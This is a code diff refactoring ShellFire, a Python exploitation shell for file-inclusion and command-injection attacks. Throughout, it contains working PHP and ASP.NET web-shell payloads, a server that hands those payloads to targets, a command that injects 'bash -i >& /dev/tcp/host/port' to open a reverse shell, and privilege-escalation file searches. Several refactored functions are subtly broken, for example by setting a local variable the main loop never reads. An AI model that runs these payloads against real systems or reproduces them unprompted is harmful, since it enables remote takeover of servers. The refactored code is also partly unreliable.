@@ -1,6 +1,6 @@
 #!/bin/env python3
 # Thanks to Offensive-Security for inspiring this!
-# Written by Unix-Ninja
+# Written by unix-ninja
 # Aug 2016
 
 import argparse
@@ -17,35 +17,46 @@ import threading
 import time
 
 ############################################################
+## Version Check
+
+if (sys.version_info < (3, 0)):
+  sys.stderr.write("[!] Error! Must execute this script with Python3.");
+  sys.exit(2)
+
+############################################################
 ## Configs
 
-version = "0.7"
-url = "http://www.example.com?"
-history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
-post_data = {}
-cookies = {}
-headers = {
-        'User-Agent': '',
-        'Referer': ''
-        }
-auth = None
-auth_user = None
-auth_pass = None
-payload = ""
-payload_type = "PHP"
-cmd_encode = None
-marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
+class cfg:
+  version = "0.7"
+  url = "http://www.example.com?"
+  history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
+  post_data = {}
+  cookies = {}
+  headers = {
+    'User-Agent': '',
+    'Referer': ''
+    }
+  method = "get"
 
-http_running = False
+  auth = None
+  auth_user = None
+  auth_pass = None
+  payload = ""
+  payload_type = "PHP"
+  encode = None
+  marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
+  http_port = 8888
+  http_running = False
+  revshell_running = False
+
+userinput = None
 
 ############################################################
 ## Payloads
 
 def payload_aspnet():
-  global payload
-  global payload_type
-  payload = f"""\
-{marker}<%
+  cfg.payload = f"""\
+{cfg.marker}<%
 Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
 Dim command = Request.QueryString("cmd")
 
@@ -53,15 +64,13 @@ Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")
 
 Dim objExec = objShell.Exec(comspec & " /c " & command)
 Dim output = objExec.StdOut.ReadAll()
-%><%= output %>{marker}
+%><%= output %>{cfg.marker}
 """
-  payload_type = "ASP.NET"
+  cfg.payload_type = "ASP.NET"
 
 def payload_php():
-  global payload
-  global payload_type
-  payload = f"""\
-{marker}<?php
+  cfg.payload = f"""\
+{cfg.marker}<?php
 if ($_GET['cmd'] == '_show_phpinfo') {{
   phpinfo();
 }} else if ($_GET['cmd'] == '_show_cookie') {{
@@ -75,17 +84,20 @@ if ($_GET['cmd'] == '_show_phpinfo') {{
 }} else {{
   system($_GET['cmd']) || print `{{$_GET['cmd']}}`;
 }}
-?>{marker}
+?>{cfg.marker}
 """
-  payload_type = "PHP"
+  cfg.payload_type = "PHP"
+
+############################################################
+## Parse options
+
+parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
+parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
+parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
+args = parser.parse_args()
 
 ############################################################
 ## Functions
-
-## support raw_input for python 3
-if (sys.version_info > (3, 0)):
-  def raw_input(prompt=None):
-    return input(prompt)
 
 def show_help(cmd=None):
   if cmd and cmd[0:1] == '.':
@@ -94,6 +106,7 @@ def show_help(cmd=None):
     sys.stdout.write(".auth - show current HTTP Auth credentials\n")
     sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
   elif cmd == "cookies":
+    sys.stdout.write(".cookies - show current cookies to be sent with each request\n")
     sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
   elif cmd == "encode":
     sys.stdout.write(".encode - show current encoding used before sending commands\n")
@@ -114,6 +127,8 @@ def show_help(cmd=None):
     sys.stdout.write("                       php\n")
     sys.stdout.write(".http start [port] - start HTTP server\n")
     sys.stdout.write(".http stop - stop HTTP server\n")
+  elif cmd == "marker":
+    sys.stdout.write(".marker <string> - set the payload output marker to string.\n")
   elif cmd == "method":
     sys.stdout.write(".method - show current HTTP method\n")
     sys.stdout.write(".method get - set HTTP method to GET\n")
@@ -142,6 +157,7 @@ Available commands:
   .help
   .history
   .http
+  .marker
   .method
   .phpinfo
   .post
@@ -153,7 +169,6 @@ Available commands:
 """)
 
 def http_server(port):
-  global http_running
   addr = ''
   conn = None
 
@@ -162,25 +177,25 @@ def http_server(port):
   sock.settimeout(1)
   sock.bind((addr, port))
   sock.listen(1)
-  while http_running == True:
+  while cfg.http_running == True:
     try:
       if not conn:
         conn, addr = sock.accept()
       request = conn.recv(1024)
 
-      http_response = "HTTP/1.1 200 OK\n\n" + payload
+      http_response = "HTTP/1.1 200 OK\n\n" + payload + "\n"
 
-      conn.sendall(http_response)
+      conn.send(bytes(http_response, 'utf-8'))
       conn.close()
       conn = None
-    except:
+    except Exception as e:
+      #sys.stderr.write("[!] Err. socket.error : %s\n" % e)
       pass
   sys.stdout.write("[*] HTTP Server stopped\n")
 
 def rev_shell(addr, port):
   port = int(port)
-  global revshell_running
-  revshell_running = True
+  cfg.revshell_running = True
   conn = None
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -196,28 +211,208 @@ def rev_shell(addr, port):
       if s == conn:
         data = s.recv(4096)
         if not data:
-          sys.stdout.write("[!] Connection closed.\n")
-          revshell_running = False
+          cfg.revshell_running = False
           return
         else:
           sys.stdout.write(data)
           sys.stdout.flush()
       else:
-        msg = raw_input()
+        msg = input()
         conn.send(msg)
 
   conn.close()
-  revshell_running = False
+  cfg.revshell_running = False
   return
 
+def cmd_auth(cmd):
+  if len(cmd) > 1:
+    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
+    cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
+  else:
+    sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
+  return
 
-############################################################
-## Parse options
+def cmd_cookies(cmd):
+  if len(cmd) < 2:
+    sys.stdout.write("[*] cookies: %s\n" % (cfg.cookies))
+  else:
+    try:
+      cmd.pop(0)
+      cfg.cookies = json.loads(" ".join(cmd))
+    except Exception as e:
+      sys.stderr.write("[!] %s\n" % e)
+  return
 
-parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
-parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
-parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
-args = parser.parse_args()
+def cmd_encode(cmd):
+  if len(cmd) == 1:
+    sys.stdout.write("[*] encoding: %s\n" % (cfg.encode))
+    return False
+  elif len(cmd) != 2:
+    sys.stderr.write("[!] Invalid parameters\n")
+    return True
+  if cmd[1] == "base64":
+    cfg.encode = cmd[1]
+    sys.stdout.write("[*] encoding set to base64\n")
+    return False
+  elif cmd[1] == "none":
+    cfg.encode = None
+    sys.stdout.write("[*] encoding removed\n")
+    return False
+  else:
+    sys.stderr.write("[!] Invalid parameters\n")
+  return False
+
+def cmd_find(cmd):
+  if len(cmd) != 2:
+    sys.stdout.write("[!] Invalid parameters\n")
+    return False
+  if cmd[1] == "setgid":
+    userinput = "find / -type f -perm -02000 -ls"
+  elif cmd[1] == "setuid":
+    userinput = "find / -type f -perm -04000 -ls"
+  else:
+    sys.stderr.write("[!] Invalid parameters\n")
+    return False
+  return True
+
+def cmd_help(cmd):
+  if len(cmd) == 2:
+    show_help(cmd[1])
+  else:
+    show_help()
+  return
+
+def cmd_history(cmd):
+  if len(cmd) == 1:
+    if os.path.isfile(cfg.history_file):
+      sys.stdout.write("[*] History writing is enabled\n")
+    else:
+      sys.stdout.write("[*] History writing is disabled\n")
+  else:
+    if cmd[1] == "clear":
+      readline.clear_history()
+      sys.stdout.write("[*] History is cleared\n")
+    elif cmd[1] == "save":
+      with open(cfg.history_file, 'a'):
+        os.utime(cfg.history_file, None)
+      sys.stdout.write("[*] History writing is enabled\n")
+    elif cmd[1] == "nosave":
+      os.remove(cfg.history_file)
+      sys.stdout.write("[*] History writing is disabled\n")
+  return
+
+def cmd_http(cmd):
+  if len(cmd) == 1:
+    if cfg.http_running == True:
+      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
+      sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
+    else:
+      sys.stdout.write("[*] HTTP server is not running\n")
+    return
+  if cmd[1] == "start":
+    if cfg.http_running == False:
+      if len(cmd) > 2:
+        try:
+          cfg.http_port = int(cmd[2])
+        except Exception as e:
+          sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
+          return False
+      s = threading.Thread(target=http_server, args=(cfg.http_port,))
+      s.start()
+      cfg.http_running = True
+      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
+    else:
+      sys.stderr.write("[!] HTTP server already running\n")
+  elif cmd[1] == "stop":
+    if cfg.http_running == True:
+      cfg.http_running = False
+      time.sleep(1)
+    else:
+      sys.stderr.write("[!] HTTP server already stopped\n")
+  elif cmd[1] == "payload":
+    if cmd[2] == "aspnet":
+      payload_aspnet()
+    elif cmd[2] == "php":
+      payload_php()
+    else:
+      sys.stderr.write("[!] Unrecognized payload type\n")
+      return
+    sys.stdout.write("[*] HTTP payload set: %s\n" % payload_type)
+  return
+
+def cmd_marker(cmd):
+  if len(cmd) != 2:
+    sys.stderr.write("[!] Invalid parameters\n")
+    return
+  cfg.marker = cmd[1]
+  sys.stdout.write("[*] Payload output marker set\n")
+  return
+
+def cmd_method(cmd):
+  if len(cmd) > 2:
+    sys.stderr.write("[!] Invalid parameters\n")
+    sys.stderr.write("    .method <method>\n")
+    return
+  if len(cmd) == 2:
+    if cmd[1] == "post":
+      cfg.method = "post"
+    else:
+      cfg.method = "get"
+  sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
+  return
+
+def cmd_phpinfo(cmd):
+  userinput = "_show_phpinfo"
+  return True
+
+def cmd_post(cmd):
+  if len(cmd) < 2:
+    cfg.post = {}
+  else:
+    cmd.pop(0)
+    #cfg.post = json.loads(userinput[len(cmd[0])+1:])
+    cfg.post = json.loads(" ".join(cmd))
+  sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
+  return
+
+def cmd_referer(cmd):
+  if len(cmd) > 1:
+    cmd.pop(0)
+    #cfg.headers['Referer'] = cfg.userinput[len(cmd[0])+1:]
+    cfg.headers['Referer'] = " ".join(cmd)
+  sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
+  return
+
+def cmd_shell(cmd):
+  if len(cmd) != 3:
+    sys.stderr.write("[!] Invalid parameters\n")
+    sys.stderr.write("    .shell <ip_address> <port>\n")
+    return
+  sys.stdout.write("[*] Initiating reverse shell...\n")
+  host = cmd[1]
+  port = cmd[2]
+  userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
+
+  # open our reverse shell in a new thread
+  s = threading.Thread(target=rev_shell, args=(host, port))
+  s.start()
+
+  # make sure the thread is init before proceeding
+  time.sleep(1)
+
+  return True
+
+def cmd_url(cmd):
+  if len(cmd) > 1:
+    cfg.url = userinput[len(cmd[0])+1:]
+  sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
+  return
+
+def cmd_useragent(cmd):
+  if len(cmd) > 1:
+    cfg.headers['User-Agent'] = userinput[len(cmd[0])+1:]
+  sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
+  return
 
 ############################################################
 ## Main App
@@ -233,7 +428,7 @@ if args.payload:
     payload_aspnet()
   else:
     sys.stderr.write("[*] Invalid payload!\n")
-  sys.stdout.write(payload)
+  sys.stdout.write(cfg.payload)
   sys.exit(1)
 
 ## show our banner
@@ -246,25 +441,18 @@ sys.stdout.write(""" (
 \__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
 |___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
 """)
-sys.stdout.write("[*] ShellFire v" + version + "\n")
+sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
 sys.stdout.write("[*] Type '.help' to see available commands\n")
 if args.debug == True:
   sys.stdout.write("[*] Debug mode enabled.\n")
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-#global http_running
-#http_running = False
-
-global revshell_running
-revshell_running = False
-
-method = "get"
 
 ## setup history
-if os.path.isfile(history_file):
+if os.path.isfile(cfg.history_file):
   try:
-    readline.read_history_file(history_file)
+    readline.read_history_file(cfg.history_file)
   except:
     pass
 
@@ -273,196 +461,83 @@ payload_php()
 
 ## main loop
 while True:
-  while revshell_running:
+  while cfg.revshell_running:
     time.sleep(0.1)
+  ## reset command execution state each loop
   exec_cmd = False
-  userinput = raw_input('>> ')
+  ## draw our prompt
+  userinput = input('>> ')
   if not userinput:
     continue
+  ## parse our input
   cmd = userinput.split()
   if cmd[0] == ".exit" or cmd[0] == ".quit":
-    http_running = False
-    if os.path.isfile(history_file):
-        readline.write_history_file(history_file)
+    cfg.http_running = False
+    if os.path.isfile(cfg.history_file):
+        readline.write_history_file(cfg.history_file)
     sys.exit(0)
   elif cmd[0] == ".auth":
-    if len(cmd) > 1:
-      auth_user, auth_pass = userinput[len(cmd[0])+1:].split(":",1)
-      auth = requests.auth.HTTPBasicAuth(auth_user, auth_pass)
-    else:
-      sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (auth_user, auth_pass))
+    cmd_auth(cmd)
   elif cmd[0] == ".cookies":
-    if not len(cmd) >2:
-      sys.stdout.write("[!] Invalid parameters\n")
-      continue
-    cookies = json.loads(userinput[len(cmd[0])+1:])
+    cmd_cookies(cmd)
   elif cmd[0] == ".encode":
-    if len(cmd) == 1:
-      exec_cmd = False
-      sys.stdout.write("[*] encoding: %s\n" % (cmd_encode))
-      continue
-    elif len(cmd) != 2:
-      sys.stdout.write("[!] Invalid parameters\n")
-      continue
-    exec_cmd = False
-    if cmd[1] == "base64":
-      cmd_encode = cmd[1]
-      sys.stdout.write("[*] encoding set to base64\n")
-      continue
-    elif cmd[1] == "none":
-      cmd_encode = None
-      sys.stdout.write("[*] encoding removed\n")
-      continue
-    else:
-      sys.stdout.write("[!] Invalid parameters\n")
-      continue
+    exec_cmd = cmd_encode(cmd)
   elif cmd[0] == ".find":
-    if len(cmd) != 2:
-      sys.stdout.write("[!] Invalid parameters\n")
-      continue
-    exec_cmd = True
-    if cmd[1] == "setgid":
-      userinput = "find / -type f -perm -02000 -ls"
-    elif cmd[1] == "setuid":
-      userinput = "find / -type f -perm -04000 -ls"
-    else:
-      sys.stdout.write("[!] Invalid parameters\n")
-      exec_cmd = False
+    exec_cmd = cmd_find(cmd)
   elif cmd[0] == ".help":
-    if len(cmd) == 2:
-      show_help(cmd[1])
-    else:
-      show_help()
+    cmd_help(cmd)
   elif cmd[0] == ".history":
-    if len(cmd) == 1:
-      if os.path.isfile(history_file):
-        sys.stdout.write("[*] History writing is enabled\n")
-      else:
-        sys.stdout.write("[*] History writing is disabled\n")
-    else:
-      if cmd[1] == "clear":
-        readline.clear_history()
-        sys.stdout.write("[*] History is cleared\n")
-      elif cmd[1] == "save":
-        with open(history_file, 'a'):
-          os.utime(history_file, None)
-        sys.stdout.write("[*] History writing is enabled\n")
-      elif cmd[1] == "nosave":
-        os.remove(history_file)
-        sys.stdout.write("[*] History writing is disabled\n")
+    cmd_history(cmd)
   elif cmd[0] == ".http":
-    if len(cmd) == 1:
-      if http_running == True:
-        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
-        sys.stdout.write("[*] HTTP payload: %s\n" % payload_type)
-      else:
-        sys.stdout.write("[*] HTTP server is not running\n")
-      continue
-    if cmd[1] == "start":
-      if http_running == False:
-        http_running = True
-        if len(cmd) > 2:
-          port = int(cmd[2])
-        else:
-          port = 8888
-        s = threading.Thread(target=http_server, args=(port,))
-        s.start()
-        sys.stdout.write("[*] HTTP server listening on %s\n" % port)
-      else:
-        sys.stdout.write("[!] HTTP server already running\n")
-    elif cmd[1] == "stop":
-      if http_running == True:
-        http_running = False
-        time.sleep(1)
-      else:
-        sys.stdout.write("[!] HTTP server already stopped\n")
-    elif cmd[1] == "payload":
-      if cmd[2] == "aspnet":
-        payload_aspnet()
-      elif cmd[2] == "php":
-        payload_php()
-      else:
-        sys.stdout.write("[!] Unrecognized payload type\n")
-        continue
-      sys.stdout.write("[*] HTTP payload set: %s\n" % payload_type)
+    cmd_http(cmd)
+  elif cmd[0] == ".marker":
+    cmd_marker(cmd)
   elif cmd[0] == ".method":
-    if len(cmd) > 2:
-      sys.stdout.write("[!] Invalid parameters\n")
-      sys.stdout.write("    .method <method>\n")
-      continue
-    if len(cmd) == 2:
-      if cmd[1] == "post":
-        method = "post"
-      else:
-        method = "get"
-    sys.stdout.write("[*] HTTP method set: %s\n" % method.upper())
+    cmd_method(cmd)
   elif cmd[0] == ".phpinfo":
-    userinput = "_show_phpinfo"
-    exec_cmd = True
+    exec_cmd = cmd_phpinfo(cmd)
   elif cmd[0] == ".post":
-    if len(cmd) < 2:
-      post = {}
-    else:
-      post = json.loads(userinput[len(cmd[0])+1:])
-    sys.stdout.write("[*] POST data set: %s\n" % post)
+    cmd_post(cmd)
   elif cmd[0] == ".referer":
-    if len(cmd) > 1:
-      headers['Referer'] = userinput[len(cmd[0])+1:]
-    sys.stdout.write("[*] Referer set: %s\n" % headers['Referer'])
+    cmd_referer(cmd)
   elif cmd[0] == ".shell":
-    if len(cmd) != 3:
-      sys.stdout.write("[!] Invalid parameters\n")
-      sys.stdout.write("    .shell <ip_address> <port>\n")
-      continue
-    sys.stdout.write("[*] Initiating reverse shell...\n")
-    host = cmd[1]
-    port = cmd[2]
-    userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
-
-    # open our reverse shell in a new thread
-    s = threading.Thread(target=rev_shell, args=(host, port))
-    s.start()
-
-    # make sure the thread is init before proceeding
-    time.sleep(1)
-
-    exec_cmd = True
+    exec_cmd = cmd_shell(cmd)
   elif cmd[0] == ".url":
-    if len(cmd) > 1:
-      url = userinput[len(cmd[0])+1:]
-    sys.stdout.write("[*] Exploit URL set: %s\n" % url)
+    cmd_url(cmd)
   elif cmd[0] == ".useragent":
-    if len(cmd) > 1:
-      headers['User-Agent'] = userinput[len(cmd[0])+1:]
-    sys.stdout.write("[*] User-Agent set: %s\n" % headers['User-Agent'])
+    cmd_useragent(cmd)
   else:
     exec_cmd = True
 
+  ## execute our command to the remote target
   if exec_cmd:
-    if cmd_encode == "base64":
+    ## make sure our encoding is correct
+    if cfg.encode == "base64":
       cmd = base64.b64encode(userinput.encode()).decode()
     else:
       cmd = re.sub('&', '%26', userinput)
       cmd = cmd.replace("\\", "\\\\")
-    if '%CMD%' in url:
-      query = re.sub('%CMD%', cmd.strip(), url)
+    ## validate the URL format
+    if '%CMD%' in cfg.url:
+      query = re.sub('%CMD%', cmd.strip(), cfg.url)
     else:
-      if '?' in url:
-        if 'cmd=' not in url:
-          query = url + '&cmd=' + cmd
+      if '?' in cfg.url:
+        if 'cmd=' not in cfg.url:
+          query = cfg.url + '&cmd=' + cmd
         else:
-          query = re.sub('cmd=', 'cmd=' + cmd, url)
+          query = re.sub('cmd=', 'cmd=' + cmd, cfg.url)
       else:
-        query = url
+        query = cfg.url
+    ## log debug info
     if args.debug:
-      sys.stdout.write("[Q] " + query + "\n")
+      sys.stdout.write("[D] " + query + "\n")
     try:
-      if method == "post":
-        r = requests.post(query, data=post, verify=False, cookies=cookies, headers=headers, auth=auth)
+      if cfg.method == "post":
+        r = requests.post(query, data=post, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
       else:
-        r = requests.get(query, verify=False, cookies=cookies, headers=headers, auth=auth)
+        r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
       ## sanitize the output. we only want to see our commands if possible
-      output = r.text.split('--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--')
+      output = r.text.split(cfg.marker)
       if len(output) > 1:
         output = output[1]
       else:
@@ -475,8 +550,8 @@ while True:
         fp.write(output)
         fp.close()
         sys.stdout.write("[*] Output saved to " + file + "\n")
-    except (Exception, e):
-      sys.stdout.write("[!] Unable to make request to target\n")
-      sys.stdout.write("[!] %s" % e)
+    except Exception as e:
+      sys.stderr.write("[!] Unable to make request to target\n")
+      sys.stderr.write("[!] %s\n" % e)
       sys.stdout.flush()
 
